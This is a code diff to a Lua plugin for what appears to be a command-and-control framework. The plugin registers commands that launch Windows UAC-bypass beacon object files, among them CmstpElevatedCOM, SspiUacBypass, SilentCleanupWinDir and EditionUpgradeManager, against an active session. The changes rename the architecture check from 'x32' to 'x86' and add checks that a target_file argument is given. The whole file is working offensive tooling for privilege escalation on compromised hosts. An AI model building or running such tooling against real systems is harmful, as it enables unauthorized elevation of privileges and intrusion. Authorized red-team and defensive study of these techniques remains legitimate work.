@@ -14,8 +14,8 @@ local function run_trustedpath(cmd)
     end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("TrustedPathDLLHijack")
@@ -35,15 +35,20 @@ cmd_trustedpath:Flags():String("local_dll_file", "",
 -- end trustedpath
 
 -- CmstpElevatedCOM
-local function run_CmstpElevatedCOM(args)
+local function run_CmstpElevatedCOM(cmd)
+    local target_file = cmd:Flags():GetString("target_file")
+    if target_file == "" then
+        error("target_file is required")
+        return
+    end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("CmstpElevatedCOM")
-    local pack_args = bof_pack("z", args[1])
+    local pack_args = bof_pack("z", target_file)
     return bof(session, script_resource(bof_file), pack_args, true)
 end
 local cmd_run_CmstpElevatedCOM = command("uac-bypass:elevatedcom",
@@ -56,10 +61,14 @@ cmd_run_CmstpElevatedCOM:Flags():String("target_file", "",
 
 -- sspi
 local function SspiUacBypass(args)
+    if #args < 1 or args[1] == "" then
+        error("target_file is required")
+        return
+    end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("SspiUacBypass")
@@ -79,8 +88,8 @@ local function run_RegistryShellCommand(cmd)
     end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("RegistryShellCommand")
@@ -105,8 +114,8 @@ local function run_SilentCleanupWinDir(cmd)
     end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("SilentCleanupWinDir")
@@ -135,8 +144,8 @@ local function run_ColorDataProxy(cmd)
     end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("ColorDataProxy")
@@ -161,8 +170,8 @@ local function run_EditionUpgradeManager(cmd)
     end
     local session = active()
     local arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
+    if arch == "x86" then
+        error("x86 not supported")
         return
     end
     local bof_file = bof_path("EditionUpgradeManager")
